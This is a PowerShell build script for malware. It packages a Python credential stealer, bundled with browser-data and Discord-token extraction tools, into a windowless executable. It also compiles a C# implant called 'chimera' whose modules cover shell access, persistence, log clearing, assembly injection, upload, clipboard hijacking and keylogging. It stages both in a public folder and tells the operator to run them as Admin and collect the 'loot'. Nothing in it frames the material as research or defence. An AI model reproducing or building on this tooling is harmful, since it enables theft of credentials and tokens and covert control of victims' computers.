param()
Set-StrictMode -Off
$ErrorActionPreference = "Stop"

$here  = Split-Path -Parent $MyInvocation.MyCommand.Path
$agent = Join-Path $here "..\agent_code"
$cmds  = Join-Path $agent "Commands"
$csc   = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
$stage = "C:\Users\Public"

Write-Host ""
Write-Host "======================================="
Write-Host "  STEP 1: Build stealer.exe"
Write-Host "======================================="

$stealerPy  = Join-Path $here "stealer.py"
$stealerExe = Join-Path $here "stealer.exe"
$hbd        = Join-Path $here "hack-browser-data.exe"
$discord    = Join-Path $here "discord_tokens.exe"

if (-not (Test-Path $stealerPy))  { Write-Host "ERROR: stealer.py not found in $here"; exit 1 }
if (-not (Test-Path $hbd))        { Write-Host "WARNING: hack-browser-data.exe not found" }
if (-not (Test-Path $discord))    { Write-Host "WARNING: discord_tokens.exe not found" }

$pi = $null
$candidates = @(
    "$env:LOCALAPPDATA\Python\pythoncore-3.15-64\Scripts\pyinstaller.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python315\Scripts\pyinstaller.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python313\Scripts\pyinstaller.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python312\Scripts\pyinstaller.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python311\Scripts\pyinstaller.exe"
)
foreach ($c in $candidates) {
    if (Test-Path $c) { $pi = $c; break }
}
if (-not $pi) {
    $found = Get-ChildItem "$env:LOCALAPPDATA\Python" -Recurse -Filter "pyinstaller.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) { $pi = $found.FullName }
}
if (-not $pi) { Write-Host "ERROR: pyinstaller.exe not found"; exit 1 }
Write-Host "[*] pyinstaller: $pi"

$buildDir = Join-Path $here "pyinstaller_build"
$piCmd = "`"$pi`" --onefile --noconsole --distpath `"$here`" --workpath `"$buildDir`" --specpath `"$buildDir`""
if (Test-Path $hbd)     { $piCmd = $piCmd + " --add-binary `"" + $hbd + ";.`"" }
if (Test-Path $discord) { $piCmd = $piCmd + " --add-binary `"" + $discord + ";.`"" }
$piCmd = $piCmd + " `"$stealerPy`""

Write-Host "[*] Running pyinstaller..."
cmd /c $piCmd

if (-not (Test-Path $stealerExe)) {
    Write-Host "ERROR: stealer.exe not found after build"
    exit 1
}
$sz = [int]((Get-Item $stealerExe).Length / 1024)
Write-Host "[+] stealer.exe built - $sz KB"

New-Item -ItemType Directory -Force -Path $stage | Out-Null
Copy-Item $stealerExe (Join-Path $stage "stealer.exe") -Force
Write-Host "[+] Copied to $stage\stealer.exe"

Write-Host ""
Write-Host "======================================="
Write-Host "  STEP 2: Build chimera_local_test.exe"
Write-Host "======================================="

if (-not (Test-Path $csc)) { Write-Host "ERROR: csc.exe not found at $csc"; exit 1 }

$out = Join-Path $here "chimera_local_test.exe"

$sourceList = @(
    (Join-Path $here "LocalTest.cs"),
    (Join-Path $here "LocalConfig.cs"),
    (Join-Path $here "LocalStubs.cs"),
    (Join-Path $agent "Staging.cs"),
    (Join-Path $agent "StringHelper.cs"),
    (Join-Path $cmds "Shell.cs"),
    (Join-Path $cmds "Ls.cs"),
    (Join-Path $cmds "Pwd.cs"),
    (Join-Path $cmds "Ps.cs"),
    (Join-Path $cmds "Screenshot.cs"),
    (Join-Path $cmds "Persist.cs"),
    (Join-Path $cmds "ClearLogs.cs"),
    (Join-Path $cmds "InjectAssembly.cs"),
    (Join-Path $cmds "Upload.cs"),
    (Join-Path $cmds "Collect.cs"),
    (Join-Path $cmds "Clipper.cs"),
    (Join-Path $cmds "Keylogger.cs"),
    (Join-Path $cmds "Help.cs")
)

$cscCmd = "`"$csc`" /target:exe /platform:x86 /out:`"$out`" /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll"
foreach ($s in $sourceList) { $cscCmd = $cscCmd + " `"$s`"" }

Write-Host "[*] Compiling..."
cmd /c $cscCmd

if (-not (Test-Path $out)) {
    Write-Host "ERROR: compile failed"
    exit 1
}
$sz2 = [int]((Get-Item $out).Length / 1024)
Write-Host "[+] chimera_local_test.exe built - $sz2 KB"

Copy-Item $out (Join-Path $stage "chimera_local_test.exe") -Force
Write-Host "[+] Copied to $stage\chimera_local_test.exe"

Write-Host ""
Write-Host "======================================="
Write-Host "  BUILD COMPLETE"
Write-Host "======================================="
Write-Host ""
Write-Host "Run as Admin:"
Write-Host "  cd C:\Users\Public"
Write-Host "  .\chimera_local_test.exe"
Write-Host ""
Write-Host "Log + loot -> C:\projects\chimera-local-test"
